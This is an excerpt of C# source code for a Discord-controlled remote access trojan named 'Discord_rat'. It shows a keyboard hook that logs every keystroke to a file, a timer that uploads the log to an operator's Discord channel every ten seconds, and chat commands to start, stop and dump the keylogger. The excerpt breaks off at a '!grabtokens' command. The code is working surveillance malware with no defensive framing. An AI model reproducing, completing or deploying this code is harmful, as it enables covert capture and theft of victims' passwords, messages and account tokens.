...
namespace Discord_rat
{
   ...
   public class WsClient : IDisposable
   {
    ...
    public class Program
    {
        ...
        public static System.Timers.Timer keyloggerTimer;
        public static string loggerPath = Application.StartupPath + @"\log.txt";
        ...
        public class KeyboardHook : IDisposable
        {
            ...
            private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
            {
                if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_KEYUP))
                {
                    ...
                    {
                        string key = FormatKey((Keys)vkCode);
                ...
                switch (key)
                {
                    ...
                    default:
                        ...
                        if (key >= Keys.A && key <= Keys.Z)
                        {
                            ...
                            bool shiftPressed = (GetKeyState(Keys.ShiftKey) & 0x8000) != 0;
        ...
        public static async Task SendKeylog()
        {
            if (!keyloggerEnabled || !File.Exists(loggerPath)) return;

            try
            {
                string logContent = File.ReadAllText(loggerPath);
                if (!string.IsNullOrEmpty(logContent.Trim()))
                {
                    if (logContent.Length >= 1990)
                    {
                        await Send_attachment(ChannelId, "Keylogger log:",
                            new List<byte[]>() { StringToBytes(logContent) },
                            new string[] { "keylog.txt" });
                    }
                    else
                    {
                        await Send_message(ChannelId, "Keylogger log:\n```" + logContent + "```");
                    }

                    File.WriteAllText(loggerPath, "");
                    Console.WriteLine("Keylog sent successfully");
                }
                else
                {
                    Console.WriteLine("No keylog content to send");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error sending keylog: " + ex.Message);
            }
        }
        ...
        public static void StartKeylogger()
        {
            ...
            try
            {
                if (!File.Exists(loggerPath))
                    File.WriteAllText(loggerPath, $"Keylogger started at {DateTime.Now}\n");
                else
                    File.AppendAllText(loggerPath, $"\nKeylogger restarted at {DateTime.Now}\n");
            }
            catch (Exception ex)
            {
            ...
            Thread keyloggerThread = new Thread(() =>
            {
                ...
                try
                {
                    ...
                    hook.KeyPressed += (sender, e) =>
                    {
                        ...
                        try
                        {
                            File.AppendAllText(loggerPath, e.KeyPressed);
                            Console.WriteLine("Key logged: " + e.KeyPressed); 
                        }
                        catch (Exception ex)
                        {
                    ...
                    hook.Start();
                    Console.WriteLine("Keyboard hook started successfully");
                ...
                {
                    Console.WriteLine("Error in keylogger thread: " + ex.Message);
                }
                finally
                {
                    hook?.Stop();
            ...
            keyloggerTimer = new System.Timers.Timer(10000);
            keyloggerTimer.Elapsed += async (sender, e) => await SendKeylog();
            keyloggerTimer.AutoReset = true;
            keyloggerTimer.Enabled = true;

            Console.WriteLine("Keylogger fully started");
        }
        ...
        public static async Task CommandHandler(string message_content, string[] attachment_urls) 
        {
            ...
            switch (command)
            {
                case "!key":
                    StartKeylogger();
                    await Send_message(ChannelId, "Keylogger start.");
                    break;

                case "!keys":
                    if (message_data.ToLower() == "stop")
                    {
                        StopKeylogger();
                        await Send_message(ChannelId, "Keylogger stop.");
                    }
                    else
                    {
                        await Send_message(ChannelId, "USE: to stop the Keylogger !keys stop");
                    }
                    break;

                case "!keylog":
                    // Enviar el log inmediatamente
                    await SendKeylog();
                    await Send_message(ChannelId, "Log Send.");
                    break;
                case "!grabtokens":
